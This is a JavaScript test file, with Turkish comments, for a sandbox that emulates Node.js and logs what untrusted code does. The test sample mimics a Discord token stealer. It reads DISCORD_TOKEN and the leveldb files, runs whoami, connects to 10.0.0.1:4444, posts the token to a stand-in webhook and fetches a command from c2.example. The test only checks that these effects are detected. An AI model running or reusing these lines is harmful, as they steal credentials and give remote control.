// Node ortamı öykünmesi öz-denetimi: node test/node-env.test.js
// Buffer/zlib/crypto gerçek Node ile karşılaştırılır; etki günlüğü türleri (src/sandbox/node-stubs.js başı) doğrulanır.
import assert from 'node:assert/strict';
import { deflateRawSync, gzipSync, brotliCompressSync } from 'node:zlib';
import { createCipheriv, createHash, createHmac, pbkdf2Sync } from 'node:crypto';
import { getQuickJS } from 'quickjs-emscripten';
import { createHost, sandboxApi } from '../src/sandbox/core.js';
import { detectEnv, resolveEnv, withEnv } from '../src/sandbox/env.js';
import { applySettings, defaultSettings } from '../src/sandbox/settings.js';
import { observable } from '../src/verify/effects.js';

const host = createHost(await getQuickJS());
const raw = sandboxApi(async (m) => host.handle(m));
const sb = withEnv(raw, 'node', { source: '// kendi kaynağı\nconsole.log(1);' });
const run = (code, o = {}) => sb.run(`try {\n${code}\n} catch (e) { console.log("!THROW " + e.message); }`, { timeoutMs: 4000, ...o });
const kinds = (r, k) => r.effects.filter((e) => e.kind === k);

// ortam tespiti
assert.equal(detectEnv('const fs = require("fs");'), 'node');
assert.equal(detectEnv('if (process.env.X) {}'), 'node');
assert.equal(detectEnv('var b = Buffer.from(x, "base64");'), 'node');
assert.equal(detectEnv('__webpack_require__("./a"); module.exports = 1; document.title = "x";'), 'browser');
assert.equal(detectEnv('var g = typeof window !== "undefined" ? window : global; var B = g.Buffer;'), 'browser');
assert.equal(resolveEnv('browser', 'require("fs")'), 'browser');
assert.equal(withEnv(raw, 'browser'), raw);
// yalnızca ortam taşıyan yapılandırma kullanıcı ayarlarının üstüne eklenir
const s = { ...defaultSettings(), now: 5, seed: 9 };
assert.deepEqual(applySettings({ type: 'run', config: { env: 'node' } }, s).config, { now: 5, seed: 9, env: 'node' });

// tarayıcı global'leri yok, Node global'leri var
const g = await run(`console.log(typeof window, typeof document, typeof navigator, typeof location, typeof global, typeof require, typeof module, typeof exports,
  __filename, __dirname, Object.prototype.toString.call(process), process.platform, typeof setImmediate, typeof Buffer, global === globalThis);`);
assert.deepEqual(g.out, ['undefined undefined undefined undefined object function object object /app/index.js /app [object process] win32 function function true']);
// tarayıcı kipi değişmedi
assert.deepEqual((await raw.run('console.log(typeof window, typeof require, typeof process)')).out, ['object undefined undefined']);

// Buffer: kodlamalar gerçek Node ile aynı
const samples = ['', 'a', 'héllo ☃ 𝄞', '\u0000\u00ff\u0100', 'x'.repeat(70), '\ud800 yalnız vekil', 'Zm9v YmFy!!=='];
const encs = ['utf8', 'base64', 'base64url', 'hex', 'latin1', 'binary', 'ascii', 'utf16le'];
const expected = [];
const lines = [];
for (const str of samples) {
  for (const e of encs) {
    expected.push(Buffer.from(str, e).toString('hex'), Buffer.from(Buffer.from(str).toString(e), e).toString('hex'), Buffer.from(str).toString(e));
    lines.push(`Buffer.from(${JSON.stringify(str)}, "${e}").toString("hex")`, `Buffer.from(Buffer.from(${JSON.stringify(str)}).toString("${e}"), "${e}").toString("hex")`, `Buffer.from(${JSON.stringify(str)}).toString("${e}")`);
  }
}
const bufRun = await run(`console.log(JSON.stringify([${lines.join(',')}]));`);
assert.deepEqual(JSON.parse(bufRun.out[0]), expected);
const misc = await run(`var b = Buffer.from([1, 2, 3, 250, 255, 0, 128, 64]);
console.log(b.readUInt32LE(0), b.readUInt32BE(4), b.readInt8(3), b.readUInt16LE(1), b.readIntBE(2, 3), b.readUIntLE(0, 6), b.indexOf(255), b.includes(Buffer.from([0, 128])),
  Buffer.concat([b.subarray(0, 2), Buffer.alloc(2, "ab")]).toString("hex"), Buffer.byteLength("☃x"), Buffer.isBuffer(b.slice(1)), b.slice(1, 3).toString("hex"), JSON.stringify(Buffer.from("hi")),
  Buffer.compare(Buffer.from("a"), Buffer.from("b")), Buffer.from("abc").equals(Buffer.from("abc")), new Buffer("616263", "hex").toString());`);
const nb = Buffer.from([1, 2, 3, 250, 255, 0, 128, 64]);
assert.equal(misc.out[0], [nb.readUInt32LE(0), nb.readUInt32BE(4), nb.readInt8(3), nb.readUInt16LE(1), nb.readIntBE(2, 3), nb.readUIntLE(0, 6), nb.indexOf(255), true,
  '0102' + Buffer.alloc(2, 'ab').toString('hex'), 4, true, '0203', '{"type":"Buffer","data":[104,105]}', -1, true, 'abc'].join(' '));

// zlib ve crypto gerçek Node ile aynı
const text = 'katman '.repeat(40);
const key = createHash('sha256').update('k').digest();
const iv = Buffer.alloc(12, 7);
const gcm = createCipheriv('aes-256-gcm', key, iv);
const gct = Buffer.concat([gcm.update(text), gcm.final()]);
const ctr = createCipheriv('aes-128-ctr', key.subarray(0, 16), Buffer.alloc(16, 1));
const zc = await run(`var z = require("node:zlib"), c = require("crypto");
console.log(z.inflateRawSync(Buffer.from("${deflateRawSync(text).toString('base64')}", "base64")).toString() === ${JSON.stringify(text)});
console.log(z.gunzipSync(Buffer.from("${gzipSync(text).toString('base64')}", "base64")).length, z.inflateSync(z.deflateSync("rt")).toString(), z.gunzipSync(z.gzipSync("gz")).toString());
console.log(z.brotliDecompressSync(Buffer.from("${brotliCompressSync(text).toString('base64')}", "base64")).toString() === ${JSON.stringify(text)});
console.log(c.createHash("sha512").update("abc").digest("hex"), c.createHmac("sha1", "key").update("data").digest("base64"), c.pbkdf2Sync("pw", "salt", 100, 20, "sha256").toString("hex"));
var key = c.createHash("sha256").update("k").digest();
var d = c.createDecipheriv("aes-256-gcm", key, Buffer.alloc(12, 7)); d.setAuthTag(Buffer.alloc(16));
console.log(d.update("${gct.toString('base64')}", "base64", "utf8") + d.final("utf8") === ${JSON.stringify(text)});
var e = c.createCipheriv("aes-128-ctr", key.subarray(0, 16), Buffer.alloc(16, 1));
console.log(e.update("${text}", "utf8", "hex") + e.final("hex"));
var cbc = c.createCipheriv("aes-192-cbc", key.subarray(0, 24), Buffer.alloc(16)); var ct = cbc.update("ab", "utf8", "base64") + cbc.update("cdefghijklmnopqrstu", "utf8", "base64") + cbc.final("base64");
var dc = c.createDecipheriv("aes-192-cbc", key.subarray(0, 24), Buffer.alloc(16)); console.log(dc.update(ct, "base64", "utf8") + dc.final("utf8"));
try { c.createDecipheriv("aes-256-cbc", Buffer.alloc(16), Buffer.alloc(16)); } catch (x) { console.log(x.code); }`);
assert.deepEqual(zc.out, ['true', `${text.length} rt gz`, 'true',
  `${createHash('sha512').update('abc').digest('hex')} ${createHmac('sha1', 'key').update('data').digest('base64')} ${pbkdf2Sync('pw', 'salt', 100, 20, 'sha256').toString('hex')}`,
  'true', Buffer.concat([ctr.update(text), ctr.final()]).toString('hex'), 'abcdefghijklmnopqrstu', 'ERR_CRYPTO_INVALID_KEYLEN']);

// etki günlüğü: env, fs, exec, ağ, taklit modüller, os, vm, exit
const fx = await run(`var t = process.env.DISCORD_TOKEN, a = process.env.appdata; Object.keys(process.env); process.env.X = "1";
var fs = require("fs");
console.log(fs.readFileSync(__filename, "utf8").indexOf("kendi kaynağı") > 0);
try { fs.readFileSync("C:/Users/user/AppData/Roaming/x/Local Storage/leveldb/1.ldb"); } catch (e) { console.log(e.code); }
fs.writeFileSync("C:/tmp/a.txt", "veri"); fs.appendFileSync("C:/tmp/a.txt", "+"); console.log(fs.readFileSync("C:\\\\tmp\\\\a.txt", "utf8"), fs.existsSync("/nope"));
fs.unlinkSync("C:/tmp/a.txt"); fs.mkdirSync("/app/d", { recursive: true }); fs.copyFileSync("/app/index.js", "/app/d/i.js"); console.log(fs.readdirSync("/app/d"));
var cp = require("node:child_process"); cp.execSync("whoami"); cp.spawn("cmd.exe", ["/c", "dir"]); cp.exec("node -e \\"console.log('cocuk')\\"");
require("https").request({ hostname: "h.example", path: "/p", method: "POST" }).end("govde");
var s = new (require("net").Socket)(); s.connect(4444, "10.0.0.1", function () { s.write("merhaba"); });
require("dns").lookup("x.example", function () {});
var ax = require("axios"); ax.post("https://w.example/hook", { content: t }).then(function (r) { console.log("then", typeof r); });
new (require("discord.js").Client)({ intents: [] }).login("tok");
require("os").hostname(); require("os").userInfo();
require("vm").runInThisContext("console.log('vm katmanı')");
new (require("worker_threads").Worker)("console.log(1)", { eval: true });
process.on("exit", function () { console.log("exit dinleyicisi"); });
process.exit(3);
console.log("buraya gelmez");`);
assert.deepEqual(fx.out, ['true', 'ENOENT', 'veri+ false', '["i.js"]', 'vm katmanı', 'exit dinleyicisi', '!THROW process.exit(3)', 'cocuk', 'then function']);
assert.deepEqual(kinds(fx, 'node.env.read').map((e) => e.target), ['DISCORD_TOKEN', 'appdata']);
assert.equal(kinds(fx, 'node.env.enum').length, 1);
assert.deepEqual(kinds(fx, 'node.env.write').map((e) => [e.target, e.detail]), [['X', '1']]);
assert.deepEqual(kinds(fx, 'node.fs.read').map((e) => e.detail), ['self', 'missing', 'vfs']);
assert.deepEqual(kinds(fx, 'node.fs.write').map((e) => [e.target, e.detail]), [['C:/tmp/a.txt', 'veri']]);
assert.equal(kinds(fx, 'node.fs.append')[0].detail, '+');
assert.equal(kinds(fx, 'node.fs.delete').length, 1);
assert.deepEqual(kinds(fx, 'node.fs.copy').map((e) => [e.target, e.detail]), [['/app/index.js', '/app/d/i.js']]);
assert.deepEqual(kinds(fx, 'node.exec').map((e) => [e.target, e.detail]), [['execSync', 'whoami'], ['spawn', 'cmd.exe /c dir'], ['exec', 'node -e "console.log(\'cocuk\')"']]);
assert.deepEqual(fx.net.map((n) => [n.api, n.url, n.method, n.body]), [
  ['https.request', 'https://h.example/p', 'POST', 'govde'], ['net.connect', 'tcp://10.0.0.1:4444', '', ''], ['dns.lookup', 'x.example', '', ''],
  ['axios.post', 'https://w.example/hook', 'POST', '{}'], ['net.write', 'tcp://10.0.0.1:4444', '', 'merhaba']]);
assert.deepEqual(kinds(fx, 'node.require').map((e) => `${e.target}:${e.detail}`), ['fs:builtin', 'child_process:builtin', 'https:builtin', 'net:builtin', 'dns:builtin',
  'axios:mock', 'discord.js:mock', 'os:builtin', 'os:builtin', 'vm:builtin', 'worker_threads:builtin']);
assert.deepEqual(kinds(fx, 'node.mock.new').map((e) => e.target), ['discord.js.Client']);
assert.deepEqual(kinds(fx, 'node.mock.call').map((e) => [e.target, e.detail]), [['axios.post', 'https://w.example/hook, {}'], ['discord.js.Client.login', 'tok']]);
assert.deepEqual(kinds(fx, 'node.os').map((e) => e.target), ['hostname', 'userInfo']);
assert.deepEqual(kinds(fx, 'eval').map((e) => e.target), ['child_process', 'vm.runInThisContext', 'worker_threads']);
assert.deepEqual(kinds(fx, 'node.exit').map((e) => e.target), ['3']);
assert.ok(observable(fx.effects).some((e) => e.kind === 'node.exec'), 'node.exec doğrulamada gözlenebilir');
assert.ok(!observable(fx.effects).some((e) => e.kind === 'node.env.read'), 'okumalar gözlenebilir değil');

// alt kip: dış girdiler farklı döner (katman açma pass'inin bağımsızlık denetimi)
const alt = await run('console.log(process.env.NOPE, process.argv.length, require("os").hostname(), String(require("left-pad")()));', { config: { node: { alt: true } } });
assert.deepEqual(alt.out, ['peel-alt 3 DESKTOP-PEEL01-peel-alt peel-alt']);

// http yanıtı ayarlanabilir (sahte yanıtlar), akış ve olay sırası Node'daki gibi
const resp = await run(`require("http").get("http://c2.example/cmd", function (res) { var d = ""; res.setEncoding("utf8"); res.on("data", function (x) { d += x; }); res.on("end", function () { console.log(res.statusCode, d); }); });`,
  { config: { responses: [{ match: 'c2.example', status: 201, body: 'whoami' }] } });
assert.deepEqual(resp.out, ['201 whoami']);

console.log('node-env: tamam');
